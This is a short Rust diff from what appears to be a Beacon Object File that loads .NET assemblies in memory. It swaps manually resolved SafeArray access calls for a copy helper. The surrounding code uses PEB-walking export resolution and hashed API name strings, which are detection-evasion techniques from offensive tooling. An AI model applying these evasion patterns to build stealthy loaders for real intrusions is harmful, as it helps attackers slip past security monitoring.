@@ -68,35 +68,9 @@ pub unsafe fn load_assembly(
     unsafe {
         let sa = OwnedSafeArray::create(VT_UI1, asm.len() as u32)
             .ok_or(BofError::Clr { hr: -1, op: "c5" })?;
-
-        // Use SafeArrayAccessData / SafeArrayUnaccessData to properly lock the
-        // array before writing — matches the legacy C implementation's approach.
-        let oleaut = opsec_peb::resolve_module(opsec_strcrypt::hash!("oleaut32.dll"))
-            .ok_or(BofError::Clr { hr: -1, op: "c5a" })?;
-        let access_fn = opsec_peb::resolve_export(
-            oleaut,
-            opsec_strcrypt::hash!("SafeArrayAccessData"),
-        )
-        .ok_or(BofError::Clr { hr: -1, op: "c5b" })?;
-        let unaccess_fn = opsec_peb::resolve_export(
-            oleaut,
-            opsec_strcrypt::hash!("SafeArrayUnaccessData"),
-        )
-        .ok_or(BofError::Clr { hr: -1, op: "c5c" })?;
-
-        type AccessFn =
-            unsafe extern "system" fn(*mut SafeArray, *mut *mut c_void) -> i32;
-        type UnaccessFn = unsafe extern "system" fn(*mut SafeArray) -> i32;
-        let sa_access: AccessFn = core::mem::transmute(access_fn);
-        let sa_unaccess: UnaccessFn = core::mem::transmute(unaccess_fn);
-
-        let mut pv: *mut c_void = core::ptr::null_mut();
-        let hr = sa_access(sa.ptr, &mut pv);
-        if hr < 0 {
-            return Err(BofError::Clr { hr, op: "c5d" });
+        if !sa.copy_from(asm) {
+            return Err(BofError::Clr { hr: -1, op: "c5b" });
         }
-        core::ptr::copy_nonoverlapping(asm.as_ptr(), pv as *mut u8, asm.len());
-        sa_unaccess(sa.ptr);
 
         let d = domain.as_raw();
         let mut asm_ptr: *mut c_void = core::ptr::null_mut();
